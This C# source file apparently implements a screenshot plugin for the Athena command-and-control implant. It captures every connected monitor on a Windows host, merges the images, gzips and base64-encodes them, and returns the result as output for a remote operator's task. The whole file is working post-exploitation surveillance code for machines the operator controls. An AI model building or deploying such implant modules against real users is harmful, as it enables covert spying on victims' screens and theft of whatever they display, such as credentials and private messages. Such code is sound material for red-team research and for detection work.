using Athena.Plugins;
using System.Drawing;
using System.Runtime.InteropServices;
using Athena.Models;
using System.IO.Compression;
using System.IO;

//Nuget - System.drawing.common 
//Only works on windows
namespace Plugins
{
    public class Screenshot : AthenaPlugin
    {
        public override string Name => "screeenshot";
        public override void Execute(Dictionary<string, string> args)
        {
            try
            {
                {
                    var bitmaps = ScreenCapture.CaptureAsync().Result;
                    //Determine the size of the combined bitmap
                    int combinedWidth = 0;
                    int maxHeight = 0;
                    foreach (var bitmap in bitmaps)
                    {
                        combinedWidth += bitmap.Width;
                        if (bitmap.Height > maxHeight)
                        {
                            maxHeight = bitmap.Height;
                        }
                    }

                    //Create a new bitmap to hold the combined image
                    var combinedBitmap = new Bitmap(combinedWidth, maxHeight);

                    //Draw each screen's bitmap onto the combined bitmap
                    int x = 0;
                    foreach (var bitmap in bitmaps)
                    {
                        using (var graphics = Graphics.FromImage(combinedBitmap))
                        {
                            graphics.DrawImage(bitmap, x, 0);
                        }
                        x += bitmap.Width;
                    }
                    //Convert to b64
                    var converter = new ImageConverter();
                    var combinedBitmapBytes = (byte[])converter.ConvertTo(combinedBitmap, typeof(byte[]));
                    byte[] outputBytes;

                    //do compress here

                    using (var memoryStream = new MemoryStream())
                    {
                        using (var gzipStream = new GZipStream(memoryStream, CompressionMode.Compress))
                        {
                            gzipStream.Write(combinedBitmapBytes, 0, combinedBitmapBytes.Length);
                        }
                        outputBytes = memoryStream.ToArray();
                    }

                    var combinedBitmapBase64 = Convert.ToBase64String(outputBytes);

                    //Save the combined bitmap to a file
                    //combinedBitmap.Save("combined_screenshots.png");

                    //Base Code
                    PluginHandler.AddResponse(new ResponseResult
                    {
                        completed = true,
                        user_output = combinedBitmapBase64,
                        task_id = (string)args["task-id"],
                    });

                }
            }
            catch (Exception e)
            {
                PluginHandler.Write(e.ToString(), (string)args["task-id"], true, "error");
                return;
            }
        }
    }


    class ScreenCapture
    {
        public static async Task<List<Bitmap>> CaptureAsync()
        {
            var bitmaps = new List<Bitmap>();
            foreach (var screen in GetScreens())
            {
                var bitmap = new Bitmap(screen.Width, screen.Height);
                using (var graphics = Graphics.FromImage(bitmap))
                {
                    graphics.CopyFromScreen(screen.X, screen.Y, 0, 0, bitmap.Size);
                }
                bitmaps.Add(bitmap);
            }
            return bitmaps;
        }

        private static IEnumerable<Screen> GetScreens()
        {
            var screens = new List<Screen>();
            foreach (var displayInfo in GetDisplayInfos())
            {
                var bounds = new Rectangle(
                    displayInfo.Bounds.X,
                    displayInfo.Bounds.Y,
                    displayInfo.Bounds.Width,
                    displayInfo.Bounds.Height);

                screens.Add(new Screen(bounds));
            }
            return screens;
        }

        private class Screen
        {
            public int X { get; }
            public int Y { get; }
            public int Width { get; }
            public int Height { get; }

            public Screen(Rectangle bounds)
            {
                X = bounds.X;
                Y = bounds.Y;
                Width = bounds.Width;
                Height = bounds.Height;
            }
        }

        [DllImport("user32.dll")]
        private static extern bool EnumDisplayMonitors(IntPtr hdc, IntPtr lprcClip, MonitorEnumProc lpfnEnum, IntPtr dwData);

        private delegate bool MonitorEnumProc(IntPtr hMonitor, IntPtr hdcMonitor, ref RECT lprcMonitor, IntPtr dwData);

        [StructLayout(LayoutKind.Sequential)]
        private struct RECT
        {
            public int left;
            public int top;
            public int right;
            public int bottom;
        }

        private class DisplayInfo
        {
            public Rectangle Bounds { get; set; }
        }

        private static List<DisplayInfo> GetDisplayInfos()
        {
            var monitors = new List<DisplayInfo>();

            var proc = new MonitorEnumProc((IntPtr hMonitor, IntPtr hdcMonitor, ref RECT lprcMonitor, IntPtr dwData) =>
            {
                var mi = new DisplayInfo();
                mi.Bounds = new Rectangle(lprcMonitor.left, lprcMonitor.top, lprcMonitor.right - lprcMonitor.left, lprcMonitor.bottom - lprcMonitor.top);
                monitors.Add(mi);
                return true;
            });

            if (!EnumDisplayMonitors(IntPtr.Zero, IntPtr.Zero, proc, IntPtr.Zero))
            {
                throw new System.ComponentModel.Win32Exception();
            }

            return monitors;
        }
    }

}